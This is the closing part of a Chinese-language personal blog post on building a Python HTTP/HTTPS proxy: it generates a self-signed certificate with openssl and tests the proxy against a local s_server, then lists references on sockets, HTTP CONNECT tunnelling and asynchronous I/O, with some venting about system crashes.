<pre><code> ~/Work/project/proxy/base_python ⮀ openssl req -new -x509 -key privkey.pem -out cert.pem
You are <span class="keyword">about</span> <span class="keyword">to</span> be asked <span class="keyword">to</span> enter information <span class="keyword">that</span> will be incorporated
<span class="keyword">into</span> your certificate request.
What you are <span class="keyword">about</span> <span class="keyword">to</span> enter <span class="keyword">is</span> what <span class="keyword">is</span> called a Distinguished Name <span class="keyword">or</span> a DN.
There are quite a few fields <span class="keyword">but</span> you can leave <span class="keyword">some</span> blank
For <span class="keyword">some</span> fields there will be a default value,
If you enter '.', <span class="keyword">the</span> field will be left blank.
<span class="comment">-----</span>
Country Name (<span class="number">2</span> letter code) [AU]:
State <span class="keyword">or</span> Province Name (full <span class="property">name</span>) [Some-State]:
Locality Name (eg, city) []:
Organization Name (eg, company) [Internet Widgits Pty Ltd]:
Organizational Unit Name (eg, section) []:
Common Name (e.g. server FQDN <span class="keyword">or</span> YOUR <span class="property">name</span>) []:
Email Address []:
</code></pre><p>把私钥和证书合在一起生成服务器能使用的文件：</p>
<pre><code>~/Work/project/proxy/base_python ⮀ cat privkey<span class="class">.pem</span> cert<span class="class">.pem</span> &gt; server.pem
</code></pre><p>建立测试https服务器</p>
<pre><code> ~<span class="regexp">/Work/</span><span class="keyword">project</span><span class="regexp">/proxy/</span>base_python ⮀ openssl s_server -accept <span class="number">8888</span> -cert server.pem -www
Using <span class="keyword">default</span> temp DH parameters
ACCEPT
ACCEPT
ACCEPT
</code></pre><p>使用浏览器先直接访问，再试着用自己写的代理服务器访问下。bingo！It really works！</p>
<h2 id="Last_but_not_least">Last but not least</h2><p>从头到尾，好像两句话就能讲清楚的原理竟然花了这么多笔墨去解释。</p>
<p>总之，如果想真的让代理“能用”，使用线程或异步I/O来实现是必然的。在以后的某天，大概会详细对各种从select到asyncio每个层面的异步来做个走马观花的简介。</p>
<h2 id="参考资料">参考资料</h2><p>主要参考资料：</p>
<ul>
<li><a href="http://docs.python.org/2/library/socket.html" target="_blank" rel="external">socket — Low-level networking interface</a></li>
<li><a href="http://www.devsec.org/info/ssl-cert.html" target="_blank" rel="external">Simple SSL cert HOWTO</a></li>
<li><a href="https://tools.ietf.org/html/rfc2616" target="_blank" rel="external">RFC2616 Hypertext Transfer Protocol – HTTP/1.1</a></li>
<li><a href="http://www.ietf.org/rfc/rfc2817.txt" target="_blank" rel="external">RFC2817 Upgrading to TLS Within HTTP/1.1</a></li>
<li><a href="http://stackoverflow.com/questions/11697943/when-should-one-use-connect-and-get-http-methods-at-http-proxy-server" target="_blank" rel="external">When should one use CONNECT and GET HTTP methods at HTTP Proxy Server?</a></li>
<li><a href="http://www.openssl.org/docs/apps/s_server.html" target="_blank" rel="external">Openssl Documentation:s_server(1)</a></li>
<li><a href="http://en.wikipedia.org/wiki/HTTP_tunnel" target="_blank" rel="external">HTTP Tunnel</a></li>
<li><a href="http://en.wikipedia.org/wiki/HTTP_Secure" target="_blank" rel="external">HTTPS</a></li>
<li><a href="http://serverfault.com/questions/473155/unable-to-load-certificate-in-openssl" target="_blank" rel="external">Unable to load certificate in openssl</a></li>
</ul>
<p>如果你想学习异步：</p>
<ul>
<li><a href="http://haypo-notes.readthedocs.org/asyncio.html" target="_blank" rel="external">The new python asyncio aka tulip</a></li>
<li><a href="http://scotdoyle.com/python-epoll-howto.html" target="_blank" rel="external">How To Use Linux epoll with Python</a></li>
<li><a href="http://www.kegel.com/c10k.html" target="_blank" rel="external">The C10K problem</a></li>
</ul>
<p>呵呵，就这些吧。竟然死机了，还连死两次，已经好久不知道什么叫死机了，白添加半天链接vim自动保存一恢复反而恢复没了。</p>
<p>最近vim倒挺顺，也不卡也不闹，本来第一次司机恢复下恢复写的内容，结果尼玛还没保存又死机死机死机死机了。firefox不知道怎么回事就卡住然后就鼠标能动键盘都卡住。还有我打字时fcitx这么卡你爸妈知道么，没以前感觉智能无所谓，要不要敲个字等一秒再出来！！！</p>
<p>忽然顺了……我擦……</p>
<h2 id="OT">OT</h2><ul>
<li><a href="https://github.com/luocheng/twisted-intro-cn" target="_blank" rel="external">Twisted简介和异步编程入门</a></li>
<li>哈哈，成功完成python2 koans</li>
</ul>

            
          </span>
        
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    

  </section>

  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/page/5/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/5/">5</a><span class="page-number current">6</span><a class="page-number" href="/page/7/">7</a><span class="space">&hellip;</span><a class="page-number" href="/page/17/">17</a><a class="extend next" rel="next" href="/page/7/"><i class="fa fa-angle-right"></i></a>
  </nav>



        </div>

        


        

      </div>

      
        
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    <div class="sidebar-inner">

      

      

      <section class="site-overview sidebar-panel  sidebar-panel-active ">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
          <img class="site-author-image" src="/images/default_avatar.jpg" alt="Liu Yuyang" itemprop="image"/>
          <p class="site-author-name" itemprop="name">Liu Yuyang</p>
        </div>
        <p class="site-description motion-element" itemprop="description">我希望生活是诗的，是画的，是无数动听的音符。我希望我是自由的，摇滚的，有一颗黑客的心。</p>
        <nav class="site-state motion-element">
          <div class="site-state-item site-state-posts">
            <a href="/archives">
              <span class="site-state-item-count">166</span>
              <span class="site-state-item-name">日志</span>
            </a>
          </div>

          <div class="site-state-item site-state-categories">
            
              <span class="site-state-item-count">23</span>
              <span class="site-state-item-name">分类</span>
              
          </div>

          <div class="site-state-item site-state-tags">
            <a href="/tags">
              <span class="site-state-item-count">57</span>
              <span class="site-state-item-name">标签</span>
              </a>
          </div>

        </nav>

        

        <div class="links-of-author motion-element">
          
            
              <span class="links-of-author-item">
                <a href="https://github.com/reverland" target="_blank">
                  
                    <i class="fa fa-github"></i> GitHub
                  
                </a>
              </span>
            
          
        </div>

        
        

        <div class="links-of-author motion-element">
          
        </div>

      </section>

      

    </div>
  </aside>


      
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright" >
  
  &copy;  2011 - 
  <span itemprop="copyrightYear">2015</span>
  <span class="with-love">
    <i class="icon-next-heart fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Liu Yuyang</span>
</div>

<div class="powered-by">
  由 <a class="theme-link" href="http://hexo.io">Hexo</a> 强力驱动
</div>

<div class="theme-info">
  主题 -
  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
    NexT
  </a>
</div>



      </div>
    </footer>

    <div class="back-to-top"></div>
  </div>

  <script type="text/javascript" src="/vendors/jquery/index.js?v=2.1.3"></script>

  
  

  
    
    

  

    <script type="text/javascript">
      var disqus_shortname = 'reverlandblog';
      var disqus_identifier = 'page/6/index.html';
      var disqus_title = '';
      var disqus_url = '';

      function run_disqus_script(disqus_script){
        var dsq = document.createElement('script');
        dsq.type = 'text/javascript';
        dsq.async = true;
        dsq.src = '//' + disqus_shortname + '.disqus.com/' + disqus_script;
        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
      }

      run_disqus_script('count.js');
      
    </script>
  


  

  
  <script type="text/javascript" src="/vendors/fancybox/source/jquery.fancybox.pack.js"></script>
  <script type="text/javascript" src="/js/fancy-box.js?v=0.4.5.2"></script>


  <script type="text/javascript" src="/js/helpers.js?v=0.4.5.2"></script>
  <script type="text/javascript" src="/vendors/velocity/velocity.min.js"></script>
<script type="text/javascript" src="/vendors/velocity/velocity.ui.min.js"></script>

<script type="text/javascript" src="/js/motion.js?v=0.4.5.2" id="motion.global"></script>


  <script type="text/javascript" src="/vendors/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  <script type="text/javascript" src="/vendors/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>

  

  <script type="text/javascript" src="/js/bootstrap.js"></script>

  
  

  
  

</body>
</html>
